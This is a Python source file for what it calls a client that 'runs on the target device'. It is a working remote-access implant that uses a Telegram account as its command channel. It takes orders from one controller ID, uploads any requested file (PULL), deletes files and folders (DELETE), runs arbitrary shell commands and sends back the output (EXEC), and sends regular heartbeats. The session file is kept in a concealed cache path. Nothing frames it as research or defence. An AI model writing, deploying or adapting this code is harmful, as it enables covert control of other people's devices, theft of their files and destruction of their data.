# client.py (place in repo as client.py)
# This is the client that runs on the target device.
# It uses the session file to connect to Telegram as the target user account.
# It listens for messages from the controller's user ID and executes commands.
# Commands supported: PULL <path>, DELETE <path>, EXEC <cmd>, SLEEP <seconds>.
# It sends a heartbeat every 60 seconds to the controller.

import asyncio
import os
import subprocess
import sys
from telethon import TelegramClient, events

API_ID = 123456          # Replace with your API ID
API_HASH = 'your_api_hash'
SESSION_PATH = os.path.expanduser('~/.config/.cache/client.session')
CONTROLLER_ID = 123456789  # Your Telegram user ID
HEARTBEAT_INTERVAL = 60

client = TelegramClient(SESSION_PATH, API_ID, API_HASH)

async def heartbeat():
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        try:
            await client.send_message(CONTROLLER_ID, 'HEARTBEAT')
        except Exception:
            pass

@client.on(events.NewMessage(from_users=CONTROLLER_ID))
async def handler(event):
    text = event.raw_text
    if text.startswith('PULL '):
        path = text[5:].strip()
        if os.path.exists(path):
            await client.send_file(CONTROLLER_ID, path)
        else:
            await client.send_message(CONTROLLER_ID, f'ERROR: {path} not found')
    elif text.startswith('DELETE '):
        path = text[7:].strip()
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            await client.send_message(CONTROLLER_ID, f'OK: deleted {path}')
        except Exception as e:
            await client.send_message(CONTROLLER_ID, f'ERROR: {e}')
    elif text.startswith('EXEC '):
        cmd = text[5:].strip()
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out, _ = proc.communicate()
            await client.send_message(CONTROLLER_ID, f'OUTPUT:\n{out.decode()}')
        except Exception as e:
            await client.send_message(CONTROLLER_ID, f'ERROR: {e}')
    elif text.startswith('SLEEP '):
        seconds = int(text[6:].strip())
        await client.send_message(CONTROLLER_ID, f'Sleeping for {seconds} seconds')
        await client.disconnect()
        await asyncio.sleep(seconds)
        await client.connect()
        await client.send_message(CONTROLLER_ID, 'Awake')

async def main():
    await client.start()
    asyncio.create_task(heartbeat())
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
